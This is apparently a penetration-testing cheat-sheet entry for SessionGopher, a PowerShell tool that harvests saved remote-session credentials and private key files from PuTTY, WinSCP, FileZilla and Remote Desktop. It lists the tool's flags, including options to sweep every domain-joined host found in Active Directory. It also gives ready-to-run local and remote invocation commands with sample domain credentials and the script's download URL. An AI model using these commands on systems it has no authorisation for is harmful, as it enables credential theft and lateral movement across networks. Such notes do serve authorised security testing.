# Commands
```ps
-Thorough: searches all drives for PuTTY private key (.ppk), Remote Desktop Connecton (.rdp), and RSA (.sdtid) files.
-o: outputs the data to a folder of .csv files
-iL: provide a file with a list of hosts to run SessionGopher against, each host separated by a newline. Provide the path to the file after -iL.
-AllDomain: SessionGopher will query Active Directory for all domain-joined systems and run against all of them.
-Target: a specific host you want to target. Provide the target host after -Target.
```

## [[Sensitive Files]]
```ps
Locally
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

Remote
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Target 10.10.10.10 -u domain.com\adm-arvanaghi -p s3cr3tP@ss -o
```

```meta
requirements: 
results: 
opsec: 
oss: #ps1
source: https://github.com/Arvanaghi/SessionGopher
description: SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
```